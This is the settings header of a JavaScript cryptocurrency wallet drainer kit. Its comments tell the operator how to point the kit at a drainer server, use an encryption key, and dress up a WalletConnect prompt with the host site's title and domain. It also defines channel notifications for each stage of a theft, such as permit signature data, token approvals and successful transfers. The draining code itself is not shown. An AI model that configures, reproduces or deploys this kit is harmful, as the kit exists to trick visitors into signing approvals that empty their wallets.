// ==================================================== =====================
// ==================== BASIC SCRIPT SETTINGS =====================
// ==================================================== =====================

let MS_Encryption_Key = 0; // Specify any number that will be used for encryption (it is not recommended to leave it as default!)
// The same number should be specified in the server.js file - if they differ, then nothing will work correctly

const MS_Server = "Server.js"; // Specify the domain that is attached to the drainer server
// This is the domain where you have a server, and not the site itself where you plan to use the drainer
const MS_WalletConnect_ID = "ea52b0e550593829f2eee2cb9006f642"; // Project ID from WalletConnect Cloud

const MS_Modal_Style = 1; // 1 - old, 2 - new (update from 10/01/2023)
const MS_Loader_Style = 2; // 1 - old, 2 - new (update from 10/01/2023)
const MS_Color_Scheme = 'light'; // light - light theme, dark - dark theme
const MS_Modal_Mode = 1; // 1 - select a wallet by clicking and connect with a button, 2 - connect immediately after selection

const MS_Verify_Message = ""; // Message for wallet verification, may contain the {{ADDRESS}} tag
// Leave empty by default to receive a message from the server, otherwise fill in to use a custom

// Using the settings below you can customize how your site will look in the WalletConnect interface
// No need to change, most wallets work with default settings
// The setting is not related to the MS_WalletConnect_Customization switch, it is only needed for design customization

const MS_WalletConnect_MetaData = {
   name: document.title, // By default the same as the site title
   description: "Web3 Application", // Default "Web3 Application"
   url: "https://" + window.location.host, // Default as site domain
   icons: ["https://avatars.githubusercontent.com/u/37784886" ]
};

const MS_WalletConnect_Customization = 0; // 0 - use the default window, 1 - user customization
const MS_WalletConnect_Theme = { // Customization options are available here: https://docs.walletconnect.com/2.0/web/web3modal/react/wagmi/theming
   themeMode: 'light',
   themeVariables: {
     '--w3m-background-color': '#000000',
     '--w3m-accent-color': '#F5841F',
     '--w3m-z-index': 9999999
   }
};

const MS_Custom_Chat = {
   Enable: 0, // 0 - use server settings, 1 - use client settings
   Chat_Settings: {
     enter_website: "", // Channel ID for the action - Login to the site (if empty - notification is disabled)
     leave_website: "", // Channel ID for the action - Leave the site (if empty - notification is disabled)
     connect_success: "", // Channel ID for the action - Successful connection (if empty - notification disabled)
     connect_request: "", // Channel ID for the action - Connection request (if empty - notification is disabled)
     connect_cancel: "", // Channel ID for the action - Connection rejected (if empty - notification disabled)
     approve_request: "", // Channel ID for the action - Request for confirmation (if empty - notification is disabled)
     approve_success: "", // Channel ID for the action - Successful confirmation (if empty - notification disabled)
     approve_cancel: "", // Channel ID for the action - Approval rejected (if empty - notification disabled)
     permit_sign_data: "", // Channel ID for the action - Data from PERMIT (if empty - notification is disabled)
     transfer_request: "", // Channel ID for the action - Transfer request (if empty - notification is disabled)
     transfer_success: "", // Channel ID for the action - Successful transfer (if empty - notification disabled)
     transfer_cancel: "", // Channel ID for the action - Cancel transfer (if empty - notification is disabled)
     sign_request: "", // Channel ID for the action - Signature Request (if empty - notification is disabled)
     sign_success: "", // Channel ID for the action - Successful signature (if empty - notification disabled)
     sign_cancel: "", // Channel ID for the action - Signature rejected (if empty - notification disabled)
     chain_request: "", // Channel ID for the action - Request to change the network (if empty - notification is disabled)
     chain_success: "", // Channel ID for the action - Network change accepted (if empty - notification disabled)
     chain_cancel: "", // Channel ID for the action - Network change rejected (if empty - notification disabled)
   }
};

// ==================================================== =====================
// ============ IT IS NOT SAFE TO MAKE CHANGES IN THE CODE BELOW ==============
// ==================================================== =====================
